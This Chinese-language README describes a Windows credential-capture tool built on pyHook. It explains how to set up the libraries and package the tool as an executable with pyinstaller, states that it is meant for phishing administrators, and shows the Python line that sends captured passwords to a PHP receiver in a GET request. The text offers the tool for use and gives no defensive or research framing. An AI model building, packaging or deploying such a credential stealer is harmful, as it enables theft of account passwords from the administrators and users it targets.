### windows凭证捕获 ##
环境准备：
```
pywin32
pyHook
requests
pycom
```
下载好pyHook后扔入以下路径：
```
C:\Program Files\Python37\Lib\site-packages
```

如果需要打包成exe话，请pip安装pyinstaller
```
pip install pyinstaller
pyinstaller -F <xxx.py>
```

可用于钓鱼管理员,最后脚本会将捕获到的:username和password

通过请求指定的php来接收密码
```python
rqt=requests.get(url='http://127.0.0.1/jieshou.php?password={}'.format(str(j)),headers={'user-agent':'nb'})
```

请自行打包exe

效果图如下：
![](https://s2.ax1x.com/2019/08/13/mpheud.gif)

由于要安装pyHook库，我这里直接上传了

不要去lfd下，那个只要窗体不是Unicode编码就直接报错了
https://www.lfd.uci.edu/~gohlke/pythonlibs/

